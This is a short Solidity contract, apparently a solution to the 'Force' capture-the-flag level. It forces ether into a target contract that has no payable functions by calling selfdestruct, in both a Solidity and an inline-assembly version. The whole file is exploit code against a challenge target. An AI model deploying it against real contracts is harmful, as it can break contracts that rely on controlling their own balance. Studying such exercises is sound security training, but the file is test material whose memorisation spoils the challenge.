// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Force {}

contract ForceHack {
    Force force;

    constructor(address payable chal) payable {
        force = Force(chal);
    }

    function SolidityBuild() public {
        selfdestruct(payable(address(force)));
    }

    function YulBuild() public {
        assembly {
            selfdestruct(sload(0))
        }
    }
}
